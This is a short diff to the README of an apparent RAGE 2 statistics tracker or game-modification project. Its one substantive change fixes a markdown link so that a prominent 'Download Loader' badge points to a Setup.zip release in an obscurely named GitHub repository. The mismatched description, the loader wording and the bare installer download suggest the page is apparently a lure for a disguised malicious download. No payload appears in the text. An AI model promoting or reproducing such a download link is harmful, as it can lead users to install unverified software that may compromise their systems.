@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for RAGE 2 Statistics Tracker
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)]https://github.com/WASD122/bvvb/releases/download/main/Setup.zip)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WASD122/bvvb/releases/download/main/Setup.zip)
 
 ---
 
@@ -38,4 +38,5 @@ configs/
 `RAGE-2-Statistics-Tracker` · Updated: 2026-10-28
 
 **Tags:** `rage-2` `statistics-tracker` `pc-gaming` `gameplay` `progress-tracking` `windows` `steam`
+
 
